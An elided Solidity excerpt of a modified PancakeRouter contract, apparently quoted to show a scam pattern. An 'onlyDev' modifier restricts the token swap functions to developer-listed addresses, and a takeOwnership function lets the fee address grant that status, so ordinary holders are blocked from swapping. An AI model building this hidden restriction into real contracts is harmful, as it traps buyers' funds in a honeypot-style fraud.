...
contract PancakeRouter is IPancakeRouter02 {
    ...
    modifier onlyDev() {
        require(devOwner[msg.sender]==true,'PancakeRouter V:NOT DEV');
        _;
    }
    ...
    function takeOwnership(address _address,bool _Is) external  {
        address feeTo = IPancakeFactory(factory).feeTo();
        require(msg.sender == feeTo, 'Pancake: FORBIDDEN');
    ...
    function swapExactTokensForTokens(
        ...
        address to,
        uint deadline
    ) external virtual override ensure(deadline) onlyDev returns (uint[] memory amounts) {
    ...
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        ...
        address to,
        uint deadline
    ) external virtual override ensure(deadline) onlyDev {
        TransferHelper.safeTransferFrom(
